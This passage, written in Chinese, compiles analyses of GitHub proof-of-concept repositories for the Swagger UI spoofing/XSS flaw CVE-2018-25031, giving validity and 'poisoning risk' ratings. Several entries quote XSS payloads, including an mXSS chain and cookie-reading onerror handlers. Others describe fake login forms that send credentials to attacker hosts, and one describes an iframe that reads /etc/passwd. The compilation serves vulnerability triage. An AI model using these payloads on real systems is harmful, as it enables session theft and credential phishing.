**危害等级:** 中危，可能导致信息泄露和欺骗

**影响版本:** <= 4.1.2

**利用条件:** 需要目标用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031 漏洞允许远程攻击者进行欺骗攻击。通过诱使用户打开特制的 URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞存在于Swagger UI 4.1.2及更早版本中。提供的POC包含一个json文件和一个yaml文件, json文件中定义了yaml文件的url, yaml文件定义了一个openapi接口。攻击者诱使用户访问包含指向恶意json文件的链接的Swagger UI页面，该JSON文件随后加载并显示恶意的 OpenAPI 定义。 投毒风险较低，主要在于如果利用代码仓库被黑客入侵，替换了 `poc.yaml` 文件内容，可能会将用户引导到恶意网站或执行恶意操作，所以风险存在，但概率较低。

**有效性：** 根据漏洞描述和搜索结果，提供的POC代码有效，可以用于显示远程 OpenAPI 定义，从而达到欺骗的目的。

**投毒风险：** 投毒风险评估为 5%。虽然当前提供的 POC 代码本身只是用于演示欺骗攻击，并不包含直接的恶意代码，但是如果攻击者能够控制 `raw.githubusercontent.com` 上的 `poc.yaml` 文件，他们就可以修改显示的 OpenAPI 定义，例如将其指向恶意网站，或包含 XSS 漏洞等。因此，存在一定的投毒风险，但主要取决于对托管 OpenAPI 定义文件的服务器的控制。 此外此POC需要依赖githubusercontent, 如果此域名被污染也可能会出现安全问题。

**利用方式：**

1.  攻击者创建一个恶意的 OpenAPI 定义文件（例如 `poc.yaml`），该文件可能指向恶意网站或包含其他恶意内容。
2.  攻击者创建一个 JSON 文件（例如 `poc.json`），该文件包含指向恶意 OpenAPI 定义文件的 URL。
3.  攻击者诱使用户访问包含指向恶意 JSON 文件的链接的 Swagger UI 页面，例如通过电子邮件、社交媒体等方式。
4.  Swagger UI 加载恶意 JSON 文件，并显示恶意的 OpenAPI 定义。
5.  用户可能会被欺骗，误以为恶意 OpenAPI 定义来自受信任的来源，从而执行恶意操作。

**项目地址:** [rasinfosec/CVE-2018-25031](https://github.com/rasinfosec/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #18

**来源**: [CVE-2018-25031-wrkk112_CVE-2018-25031.md](../2018/CVE-2018-25031-wrkk112_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 是 Swagger UI 中的一个欺骗漏洞。攻击者可以通过诱导受害者打开一个特制的URL，从而显示远程的 OpenAPI 定义。提供的POC代码展示了利用此漏洞的步骤，包括使用一个包含恶意 OpenAPI 定义的JSON文件。该JSON文件指定了远程的YAML文件，其中ismsxss.yaml包含XSS payload。具体来说，ismsxss.yaml包含一段JavaScript代码（`<img onerror=alert(document.domain) src>`），这段代码会在Swagger UI中执行，从而实现跨站脚本攻击（XSS）。

**有效性：** 根据漏洞信息和POC代码，漏洞是有效的。攻击者通过诱导用户打开包含恶意链接的网页，可以执行XSS攻击。

**投毒风险：** 通过分析提供的POC代码，未发现明显的作者隐藏的投毒代码。虽然POC代码中包含XSS payload，但这是为了验证漏洞的存在，并非恶意投毒。因此，投毒风险为0%。

**利用方式：**

1.  攻击者创建一个包含指向恶意 OpenAPI 定义文件的 URL。
2.  攻击者通过社会工程学等方法诱导受害者点击该 URL。
3.  受害者的 Swagger UI 加载恶意的 OpenAPI 定义文件。
4.  恶意 OpenAPI 定义文件中的 XSS payload 在受害者的浏览器中执行，从而实现攻击目的。例如，可以窃取用户的Cookie或执行其他恶意操作。

**项目地址:** [wrkk112/CVE-2018-25031](https://github.com/wrkk112/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---



---

## POC #7

**来源**: [CVE-2018-25031-h2oa_CVE-2018-25031.md](../2018/CVE-2018-25031-h2oa_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统运行存在漏洞的Swagger UI实例，且受害者点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI中的一个漏洞，允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程OpenAPI定义。漏洞的根本原因是Swagger UI在处理URL输入时存在缺陷，允许攻击者控制Swagger UI加载的API定义来源。

**有效性：**
提供的POC代码有效。`poc.json`指定了要加载的远程OpenAPI定义文件的URL，`poc.yaml`包含了将被显示的恶意API定义。当用户访问包含该URL的Swagger UI页面时，会显示`poc.yaml`中定义的API信息，从而实现欺骗。

**投毒风险：**
该存储库存在一定的投毒风险，约为10%。虽然提供的`poc.json`和`poc.yaml`文件本身没有恶意代码，但攻击者可能通过以下方式进行投毒：

1.  **URL替换：** 攻击者可能会修改`poc.json`中的URL，指向包含恶意JavaScript代码的OpenAPI定义文件，从而在用户访问Swagger UI页面时执行恶意代码（虽然此漏洞主要描述是欺骗，但是不排除被利用做成XSS攻击）。
2.  **协作用户投毒：** 如果存储库允许协作，恶意用户可能会提交包含恶意代码的OpenAPI定义文件。

需要强调的是，目前提供的POC代码主要用于欺骗攻击，旨在展示伪造的API定义。要实现完整的攻击，还需要结合其他漏洞（如XSS）或社工手段。

**利用方式：**
1.  攻击者构造包含指向恶意`poc.json`文件的URL。
2.  攻击者诱使受害者点击该URL。可以通过邮件、社交媒体或其他方式进行诱导。
3.  受害者在其浏览器中打开包含该URL的Swagger UI页面。
4.  Swagger UI加载`poc.json`中指定的远程OpenAPI定义文件（`poc.yaml`）。
5.  Swagger UI显示`poc.yaml`中定义的API信息，受害者看到的是被篡改过的API文档。

**项目地址:** [h2oa/CVE-2018-25031](https://github.com/h2oa/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #8

**来源**: [CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md](../2018/CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing Attack)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意链接传播

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及其他版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。通过诱使用户打开精心制作的URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞利用方式是，攻击者构造包含指向恶意 OpenAPI 定义（例如 test.json 或 test.yaml）的 URL，诱使用户在 Swagger UI 中加载该 URL。Swagger UI 会解析并显示恶意 OpenAPI 定义，从而允许攻击者欺骗用户。提供的PoC代码包含 `test.json` 和 `test.yaml` 两个文件。`test.json` 包含指向 `test.yaml` 的链接，而 `test.yaml` 包含 OpenAPI 定义，其中嵌入了恶意链接 `<a href="https://evil.com">Sitio malicioso</a>`。当 Swagger UI 显示此定义时，恶意链接将被呈现，如果用户点击，可能会被重定向到恶意网站。投毒风险较低，因为主要是通过恶意链接进行欺骗，而不是在代码中直接执行恶意操作。主要风险在于用户交互的部分，如果用户不点击恶意链接，风险相对较小。考虑到Github仓库的可信性未知以及`test.yaml`中存在 `evil.com` 的可疑域名，综合估计投毒风险为10%。

**项目地址:** [h4ckt0m/CVE-2018-25031-test](https://github.com/h4ckt0m/CVE-2018-25031-test)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #9

**来源**: [CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md](../2018/CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2 (也可能存在于更高版本)

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义。根据搜索结果和漏洞信息，该漏洞的PoC是有效的。攻击者可以利用此漏洞，通过加载恶意的OpenAPI定义文件（例如xss.yaml）来欺骗用户，甚至可能执行跨站脚本攻击(XSS)。

**有效性：**

提供的PoC代码是有效的，因为它包含一个README.md文件、用于定义远程OpenAPI定义的JSON文件（poc.json），以及两个YAML文件（poc.yaml和xss.yaml）。其中，xss.yaml包含恶意的JavaScript代码，可以触发XSS攻击。

**投毒风险：**

代码仓库的投毒风险较低，约为10%。虽然xss.yaml文件包含潜在的XSS攻击代码，但它属于PoC的一部分，用于演示漏洞。其他文件看起来是合法的OpenAPI定义文件或配置文件，没有发现明显的恶意代码。但仍需谨慎，因为攻击者可能在OpenAPI定义中嵌入其他类型的恶意行为，例如SSRF攻击。

**利用方式：**

1.  攻击者创建一个包含恶意内容的OpenAPI定义文件(例如xss.yaml，包含`<noscript>`标签尝试注入XSS)。
2.  攻击者将此文件托管在远程服务器上。
3.  攻击者构造一个包含特定参数的URL，诱使用户打开，该URL指向受影响的Swagger UI实例，并指定加载恶意OpenAPI定义文件的URL作为参数。
4.  当用户打开该URL时，Swagger UI会加载并显示恶意OpenAPI定义文件，从而可能导致欺骗或XSS攻击。

总结来说，该漏洞的利用方式是通过欺骗用户加载恶意的OpenAPI定义文件，从而控制Swagger UI的显示内容，甚至执行恶意脚本。

**项目地址:** [hev0x/CVE-2018-25031-PoC](https://github.com/hev0x/CVE-2018-25031-PoC)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #10

**来源**: [CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md](../2018/CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md)

## CVE-2018-25031-Swagger UI Spoofing/SSRF/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或恶意代码执行

**影响版本:** <= 4.1.2 (可能更高版本也受影响)

**利用条件:** 需要目标系统使用存在漏洞版本的Swagger UI，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程 OpenAPI 定义。漏洞利用方式：

1.  **欺骗攻击 (Spoofing):** 攻击者可以托管一个恶意的 OpenAPI 定义（例如 YAML 或 JSON 文件）。
2.  **诱导用户：** 攻击者构建一个包含指向恶意 OpenAPI 定义的 URL。然后，攻击者诱使用户点击此 URL。这可以通过社会工程学或其他技术实现。
3.  **Swagger UI 显示恶意定义：** 当用户访问包含恶意定义的 URL 时，Swagger UI 将加载并显示该恶意定义。
4.  **XSS/信息窃取:** 恶意的 OpenAPI 定义可以包含恶意HTML/JavaScript代码，例如，在`description`字段中插入`<script>`标签或者`<form>`标签，在用户浏览器中执行，从而窃取用户信息（例如cookie）或执行其他恶意操作，比如进行钓鱼。

从提供的漏洞利用代码来看， `poc3.yaml`和`try.yaml` 文件中， `description` 字段包含了`<form>`标签，模拟了一个登录表单，目的是诱骗用户输入用户名和密码，并将这些信息发送到攻击者控制的服务器 `ttqbbaf0yx45z9zqgpmfcvjyhpngbcz1.oastify.com` 。另外，还包含一个`onerror`事件的图像标签，当图片加载失败时，会执行JavaScript代码`alert(document.cookie)`，从而可能泄露用户的cookie信息。 这些代码证明了利用此漏洞执行XSS攻击，窃取用户信息的可能性。

**投毒风险分析:**

虽然主要的攻击向量是利用Swagger UI的缺陷来展示恶意的OpenAPI定义，但代码仓库中存在一定的投毒风险。这种风险主要体现在：

*   攻击者可能会在 YAML/JSON 文件中加入一些隐蔽的恶意代码，例如混淆的 JavaScript 或利用其他漏洞的代码片段。然而，从提供的代码中看，主要利用方式较为直接，没有明显的隐藏后门。
*   仓库本身可能被篡改，虽然代码相对简单，但仓库维护者的身份以及代码的来源都存在一定的不确定性，不能完全排除代码仓库所有者添加恶意代码的可能性。

因此，综合考虑以上因素，判断存在10%的投毒风险。

**项目地址:** [johnlaurance/CVE-2018-25031-test2](https://github.com/johnlaurance/CVE-2018-25031-test2)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #11

**来源**: [CVE-2018-25031-kriso4os_CVE-2018-25031.md](../2018/CVE-2018-25031-kriso4os_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示欺骗/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本攻击 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI中，攻击者可以通过诱使用户打开一个特制的URL，从而显示远程OpenAPI定义。该URL可以指向攻击者控制的服务器，显示恶意的API文档或利用XSS漏洞。根据提供的POC代码，`XSS.yaml`文件中包含一个XSS payload: `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>`。当Swagger UI渲染此文件时，会触发`alert(document.domain)`，表明XSS攻击成功。`poc.yaml` 仅包含基本的openapi定义，并未包含任何恶意代码。

**有效性：** 提供的POC代码有效，可以利用该漏洞。

**投毒风险：** 经过分析，提供的POC代码主要用于演示漏洞，未发现作者隐藏的恶意代码。因此，投毒风险为0%。代码中引用的远程yaml文件地址指向githubusercontent.com，如果该代码库被劫持或者作者主动添加恶意代码，则可能产生投毒。

**利用方式：** 
1.  攻击者构建一个包含恶意OpenAPI定义的YAML或JSON文件，其中包含XSS payload，例如`XSS.yaml`。
2.  攻击者创建一个恶意URL，该URL指向受影响的Swagger UI实例，并包含参数，指定要加载的恶意OpenAPI定义文件的URL。
3.  攻击者诱使用户点击该恶意URL。
4.  当用户点击恶意URL后，Swagger UI会加载并渲染攻击者提供的OpenAPI定义文件。
5.  如果OpenAPI定义文件中包含XSS payload，则会在用户的浏览器中执行恶意代码，从而导致跨站脚本攻击。
6.  攻击者可以利用该漏洞窃取用户的敏感信息或执行其他恶意操作。此外，攻击者也可以利用该漏洞进行欺骗攻击，例如显示虚假的API文档，诱导用户进行错误的操作。

**项目地址:** [kriso4os/CVE-2018-25031](https://github.com/kriso4os/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #12

**来源**: [CVE-2018-25031-labeebSabbah_CVE-2018-25031.md](../2018/CVE-2018-25031-labeebSabbah_CVE-2018-25031.md)

## CVE-2018-25031-SwaggerUI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/信息泄露/SSRF

**影响应用:** SwaggerUI

**危害等级:** 中危，可能导致信息泄露和潜在的中间人攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者可以通过诱使用户打开特制的 URL 来显示远程 OpenAPI 定义。攻击者提供的 htmli.json 文件包含指向恶意 htmli.yaml 文件的 URL。htmli.yaml 文件包含一段 HTML 代码，该代码伪造一个登录表单，并将用户输入的 email 和 password 发送到 `http://10.212.234.14/`。因此利用方式是，攻击者诱骗用户点击恶意链接，swaggerUI 加载恶意的 OpenAPI 定义，在 SwaggerUI 界面上展示伪造的登录表单，当用户输入登录信息时，攻击者可以窃取用户的凭据。由于yaml文件内容明确，不包含其它恶意代码，因此投毒风险为0%。利用方式总结：

1.  **漏洞利用：** 攻击者制作包含恶意 OpenAPI 定义的 YAML 文件。
2.  **诱导用户：** 攻击者通过某种方式（例如，电子邮件、社交媒体）诱使用户点击包含恶意 YAML 文件 URL 的链接。
3.  **欺骗：** 当用户点击链接时，Swagger UI 会加载恶意 YAML 文件，并显示其中的内容。攻击者可以在 YAML 文件中嵌入恶意 HTML 或 JavaScript 代码，例如伪造登录表单，诱骗用户输入敏感信息。
4.  **信息窃取：** 如果用户在伪造的登录表单中输入了用户名和密码，这些信息将被发送到攻击者指定的服务器。

**有效性：** 提供的 POC 代码有效，可以重现欺骗攻击。

**利用方式总结：**

攻击者利用 Swagger UI 加载远程 OpenAPI 定义的特性，通过诱骗用户点击恶意链接，加载包含恶意 HTML 代码的 YAML 文件，从而实现欺骗攻击。该漏洞的利用需要用户交互，风险等级为中危。

**项目地址:** [labeebSabbah/CVE-2018-25031](https://github.com/labeebSabbah/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #13

**来源**: [CVE-2018-25031-mathis2001_CVE-2018-25031.md](../2018/CVE-2018-25031-mathis2001_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统使用存在漏洞的Swagger UI版本，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 60%

## 详情

CVE-2018-25031 是一个存在于 Swagger UI 4.1.2 及更早版本中的漏洞。攻击者可以诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，造成欺骗攻击。

**有效性：**
提供的 POC 代码有效。通过 `configUrl` 或 `url` 参数，Swagger UI 可以加载远程的 OpenAPI 定义文件（JSON 或 YAML）。

**投毒风险：**
该仓库存在一定的投毒风险，风险为60%。原因如下：

*   **远程加载：** POC 利用了 Swagger UI 加载远程定义文件的功能。攻击者可以控制远程文件的内容。
*   **恶意内容：** `f.yaml` 包含大量的 XSS payload，旨在利用 Swagger UI 中的漏洞执行恶意 JavaScript 代码。例如，`<img src=x oNlY=1 oNerror=alert('xxs')//`  等。
*   **钓鱼攻击：**  `f.yaml` 中包含伪造的登录表单，诱导用户提交敏感信息到攻击者控制的服务器。
*   **SSRF风险：** `f.yaml`中包含`<iframe src=file:///etc/passwd></iframe>`，尝试读取服务器本地文件。
*   **不确定性:** 虽然漏洞利用代码的作者提供了一些payload，但这些payload本身具有攻击性。恶意使用这些Payload,可能会被作者追踪到恶意行为。但作者也可能为了混淆视听，将一些恶意的代码进行隐藏。

**利用方式：**

1.  **发现目标：** 寻找使用了存在漏洞的 Swagger UI 版本的应用。
2.  **构造恶意 URL：**  构造包含 `configUrl` 或 `url` 参数的 URL，指向攻击者控制的 JSON 或 YAML 文件。
3.  **诱骗受害者：**  通过钓鱼或其他方式诱骗受害者点击该 URL。
4.  **执行攻击：**  当受害者访问该 URL 时，Swagger UI 会加载攻击者提供的恶意定义文件，从而执行 XSS 代码或进行其他攻击（例如，窃取 cookie、重定向用户等）。

**总结：**
该漏洞的利用依赖于社会工程学，需要诱骗用户点击恶意链接。攻击者可以利用该漏洞进行钓鱼、XSS 攻击，甚至可能进行 SSRF 攻击。同时，提供的 POC 代码包含多种攻击 Payload，存在较高的投毒风险。

**项目地址:** [mathis2001/CVE-2018-25031](https://github.com/mathis2001/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #14

**来源**: [CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md](../2018/CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md)

## CVE-2018-25031 - Swagger UI SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗攻击

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或重定向到恶意API定义

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI 4.1.2及更早版本中的一个漏洞，允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义，从而欺骗用户。从搜索结果和漏洞描述来看，攻击依赖于用户交互，需要诱导用户点击恶意链接。漏洞利用代码提供了一个简单的`exploit.yaml`文件，该文件定义了一个Swagger API规范，包含标题和描述，可能用于展示SSRF漏洞。如果这个YAML文件托管在攻击者控制的服务器上，并通过恶意链接传递给Swagger UI，则Swagger UI会加载该文件，从而实现欺骗攻击。**有效性：** 提供的POC代码本身并不能直接实现攻击，需要结合构造的URL和受害者点击才能生效，因此属于间接PoC。**投毒风险：** 分析POC代码，`exploit.yaml` 非常简单，仅仅包含swagger版本，info信息。作者投毒可能性较低，但不能完全排除，例如通过引用远程资源或包含恶意脚本，风险评估为10%。**利用方式：** 攻击者构造包含恶意swagger定义文件URL的链接，诱使用户点击。用户点击链接后，Swagger UI加载并显示恶意swagger定义，从而实现欺骗或SSRF攻击。

**项目地址:** [natpakun/SSRF-CVE-2018-25031-](https://github.com/natpakun/SSRF-CVE-2018-25031-)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #15

**来源**: [CVE-2018-25031-nigartest_CVE-2018-25031.md](../2018/CVE-2018-25031-nigartest_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示漏洞

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意脚本执行

**影响版本:** <= 4.1.2 (可能影响更高版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱使用户打开精心制作的 URL，来显示远程的恶意 OpenAPI 定义。根据搜索结果和漏洞库信息，该漏洞的核心在于 Swagger UI 未能充分验证和过滤用户提供的 URL，导致可以加载并渲染来自任意来源的 OpenAPI 定义文件。这使得攻击者可以欺骗用户，展示伪造的 API 文档，甚至通过在 OpenAPI 定义中插入恶意 HTML 或 JavaScript 代码，实现跨站脚本攻击（XSS）。

**有效性：** 提供的 POC 代码有效。`domxss.yaml` 文件包含用于触发 DOM XSS 的恶意代码， `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>` 。 `poc.json` 和 `poc.yaml` 文件用于指定要加载的恶意 OpenAPI 定义文件。

**投毒风险：** 仓库中存在少量投毒风险。`domxss.yaml` 使用了 `otlu3omsk1ath8ur17a2kldtmksbg34s.oastify.com` 作为 `basePath`，这可能用于收集受害者的 IP 地址或进行其他形式的侦察。但核心的 XSS payload 和利用方式比较直接，主要的目的是验证漏洞，投毒的可能性较小。风险比例预估为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的 OpenAPI 定义文件（例如 `domxss.yaml`）。
2.  攻击者将此文件托管在公开可访问的 URL 上（例如 GitHub Raw Content）。
3.  攻击者构造一个包含指向恶意 OpenAPI 定义文件 URL 的链接。
4.  攻击者诱使受害者点击该链接。
5.  受害者的浏览器加载 Swagger UI，并从攻击者指定的 URL 加载恶意 OpenAPI 定义文件。
6.  Swagger UI 渲染恶意 OpenAPI 定义文件，从而执行其中的恶意代码（例如 XSS payload）。

**项目地址:** [nigartest/CVE-2018-25031](https://github.com/nigartest/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #16

**来源**: [CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md](../2018/CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-UI Misrepresentation of Critical Information

**漏洞编号:** CVE-2018-25031

**漏洞类型:** UI Misrepresentation of Critical Information (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户信任被欺骗的API定义，进而遭受钓鱼攻击或其他恶意行为。

**影响版本:** < 4.1.3

**利用条件:** 受害者需要点击攻击者构造的恶意URL。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者可以通过诱骗受害者打开一个特制的URL，该URL指向攻击者控制的OpenAPI定义文件，从而在Swagger UI界面上显示被篡改的信息。这可能导致用户信任恶意API定义，并泄露敏感信息或执行非预期的操作。

**有效性分析：**
根据漏洞信息和搜索引擎结果，该漏洞利用需要用户交互，攻击者通过构造恶意URL，诱导用户点击。POC代码使用Selenium模拟浏览器行为，访问目标Swagger UI页面，并加载恶意的OpenAPI定义文件。如果Swagger UI版本低于4.1.3，则可能受到攻击，界面会显示恶意定义的内容。

**投毒风险分析：**
POC代码主要功能是验证目标Swagger UI是否存在CVE-2018-25031漏洞，通过selenium模拟点击，然后检测response log中是否存在外部恶意链接，从而检测目标是否存在该漏洞。
*   `swagger-exploit.py`: 这个脚本使用Selenium自动化测试，访问目标 Swagger UI 页面，并尝试加载两个恶意的 OpenAPI 定义文件（`hacked1.json` 和 `hacked2.json`）。它会检查网络请求日志，以确定目标是否加载了这些文件。如果加载了，则表明目标存在漏洞。该脚本没有发现任何明显的投毒代码。
*   `README.md`: 这个文件提供了关于如何使用脚本的说明。它包含安装依赖项和运行脚本的说明。也没有发现恶意代码。
所以投毒风险很低。

**利用方式分析：**
1.  攻击者构造包含`configUrl`或`url`参数的恶意URL，指向攻击者控制的OpenAPI定义文件。
2.  攻击者诱骗受害者点击该恶意URL，例如通过钓鱼邮件或社交媒体。
3.  受害者的浏览器加载恶意URL，Swagger UI显示攻击者提供的OpenAPI定义文件。
4.  如果攻击者篡改了API定义文件中的信息，例如API端点、参数说明等，受害者可能会被误导，从而遭受攻击，比如提交敏感信息到错误的端点。

该漏洞是一种客户端漏洞，主要利用用户交互进行攻击，通过欺骗用户信任恶意API定义来实现攻击目标。

**项目地址:** [rafaelcintralopes/SwaggerUI-CVE-2018-25031](https://github.com/rafaelcintralopes/SwaggerUI-CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #17

**来源**: [CVE-2018-25031-rasinfosec_CVE-2018-25031.md](../2018/CVE-2018-25031-rasinfosec_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗

**影响版本:** <= 4.1.2

**利用条件:** 需要目标用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031 漏洞允许远程攻击者进行欺骗攻击。通过诱使用户打开特制的 URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞存在于Swagger UI 4.1.2及更早版本中。提供的POC包含一个json文件和一个yaml文件, json文件中定义了yaml文件的url, yaml文件定义了一个openapi接口。攻击者诱使用户访问包含指向恶意json文件的链接的Swagger UI页面，该JSON文件随后加载并显示恶意的 OpenAPI 定义。 投毒风险较低，主要在于如果利用代码仓库被黑客入侵，替换了 `poc.yaml` 文件内容，可能会将用户引导到恶意网站或执行恶意操作，所以风险存在，但概率较低。

**有效性：** 根据漏洞描述和搜索结果，提供的POC代码有效，可以用于显示远程 OpenAPI 定义，从而达到欺骗的目的。

**投毒风险：** 投毒风险评估为 5%。虽然当前提供的 POC 代码本身只是用于演示欺骗攻击，并不包含直接的恶意代码，但是如果攻击者能够控制 `raw.githubusercontent.com` 上的 `poc.yaml` 文件，他们就可以修改显示的 OpenAPI 定义，例如将其指向恶意网站，或包含 XSS 漏洞等。因此，存在一定的投毒风险，但主要取决于对托管 OpenAPI 定义文件的服务器的控制。 此外此POC需要依赖githubusercontent, 如果此域名被污染也可能会出现安全问题。

**利用方式：**

1.  攻击者创建一个恶意的 OpenAPI 定义文件（例如 `poc.yaml`），该文件可能指向恶意网站或包含其他恶意内容。
2.  攻击者创建一个 JSON 文件（例如 `poc.json`），该文件包含指向恶意 OpenAPI 定义文件的 URL。
3.  攻击者诱使用户访问包含指向恶意 JSON 文件的链接的 Swagger UI 页面，例如通过电子邮件、社交媒体等方式。
4.  Swagger UI 加载恶意 JSON 文件，并显示恶意的 OpenAPI 定义。
5.  用户可能会被欺骗，误以为恶意 OpenAPI 定义来自受信任的来源，从而执行恶意操作。

**项目地址:** [rasinfosec/CVE-2018-25031](https://github.com/rasinfosec/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #18

**来源**: [CVE-2018-25031-wrkk112_CVE-2018-25031.md](../2018/CVE-2018-25031-wrkk112_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

